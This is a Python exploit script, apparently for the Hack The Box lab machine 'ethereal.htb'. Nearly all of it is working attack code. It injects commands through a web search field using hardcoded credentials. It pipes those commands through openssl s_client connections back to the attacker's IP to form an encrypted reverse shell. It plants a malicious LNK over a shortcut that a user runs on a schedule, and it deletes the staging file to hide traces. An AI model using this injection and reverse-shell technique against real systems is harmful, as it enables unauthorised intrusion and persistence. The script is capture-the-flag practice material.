#!/usr/bin/python
# -*- coding: utf​-8​ -*-
"""
Prerequisites:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
sudo openssl s_server -quiet -key key.pem -cert cert.pem -port 73
sudo openssl s_server -quiet -key key.pem -cert cert.pem -port 136
"""
__author__ = "artikrh"
import netifaces as ni
import sys,requests,urllib,base64,socket
try:
	from bs4 import BeautifulSoup
except ImportError:
	print "BeautifulSoup library missing. Run: sudo pip install beautifulsoup4"
	sys.exit(1)

CPURP = '\033[95m'
CGREEN = '\033[92m'
CRED = '\033[91m'
CEND = '\033[0m'

def main(ip):
	check_port(73)
	check_port(136)
	hostname_resolves('ethereal.htb')

	try:
		with open("./others/output.lnk", "rb") as lnk: # generated LNK from the modified LNKup script
			enc = base64.b64encode(lnk.read())
	except:
		print "{}[*]{} File 'output.lnk' is missing, generate it first by running: python others/generate.py".format(CRED,CEND)
		sys.exit()

	html = requests.get('http://ethereal.htb:8080/', headers={'Authorization': 'Basic YWxhbjohQzQxNG0xN3k1N3IxazNzNGc0MW4h'}).text

	# get hidden parameters that change after a reset
	soup = BeautifulSoup( html, features='lxml' )
	vsg = soup.find( 'input', attrs={'id':'__VIEWSTATEGENERATOR'} )['value']
	vs = soup.find( 'input', attrs={'id':'__VIEWSTATE'} )['value']
	ev = soup.find( 'input', attrs={'id':'__EVENTVALIDATION'} )['value']

	cmd1 = 'echo {} > C:\Windows\\tracing\\ak.b64'.format(enc) # save b64 encoded value of output.lnk to the target
	cmd2 = 'C:\Progra~2\OpenSSL-v1.1.0\\bin\openssl.exe base64 -d -in C:\Windows\\tracing\\ak.b64 -out "C:\Users\Public\Desktop\Shortcuts\Visual Studio 2017.lnk"' # decode b64 encoded file and replace it with 'Visual Studio 2017.lnk' which jorge runs every 60 seconds
	cmd3 = 'del C:\Windows\\tracing\\ak.b64' # clean up after (the 'Visual Studio 2017.lnk' gets replaced with the original as well

	print '{}[*]{} Transferring the malicious LNK file to target...'.format(CPURP,CEND)
	req(vs,vsg,ev,cmd1,ip)
	req(vs,vsg,ev,cmd2,ip)
	print '{}[*]{} Cleaning up...'.format(CPURP,CEND)
	req(vs,vsg,ev,cmd3,ip)
	print '{}[*]{} You should receive openssl shell as jorge within 60 seconds!'.format(CGREEN,CEND)

def req(vs,vsg,ev,cmd,ip):
	headers = {
		'Authorization': 'Basic YWxhbjohQzQxNG0xN3k1N3IxazNzNGc0MW4h', # authentication credentials to ethereal.htb:8080
		'Content-Type': 'application/x-www-form-urlencoded', # web server should understand the type of data we are sending
	}

	data = '__VIEWSTATE={}&__VIEWSTATEGENERATOR={}&__EVENTVALIDATION={}&search=-n+1+{}+%7C+C%3A%5CProgra%7E2%5COpenSSL-v1.1.0%5Cbin%5Copenssl.exe+s_client+-quiet+-connect+{}%3A73%7C+cmd.exe+%2Fc+{}+%7C+C%3A%5CProgra%7E2%5COpenSSL-v1.1.0%5Cbin%5Copenssl.exe+s_client+-quiet+-connect+{}%3A136&ctl02='.format(urllib.quote(vs),urllib.quote(vsg),urllib.quote(ev),ip,ip,urllib.quote(cmd),ip)

	requests.post('http://ethereal.htb:8080/', headers=headers, data=data, verify=False)

def check_port(nr):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	result = sock.connect_ex(('127.0.0.1',nr)) # Generates 'ERROR' in pipe's stdout, ignore as per validation
	if result != 0:
		print '{}[*]{} Port {} is not listening for connections. Exiting...'.format(CRED,CEND,nr)
		sys.exit()

def hostname_resolves(hostname):
	try:
		socket.gethostbyname(hostname)
	except socket.error:
		print '{}[*]{} Missing ethereal.htb entry in /etc/hosts. Exiting...'.format(CRED,CEND)
		sys.exit()

if __name__ == "__main__":
	try:
		ni.ifaddresses('tun0')
		ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
	except:
		print '{}[*]{} Failed to retrieve tun0 IP address. Is your VPN on?'.format(CRED,CEND)
                sys.exit()

	main(ip)
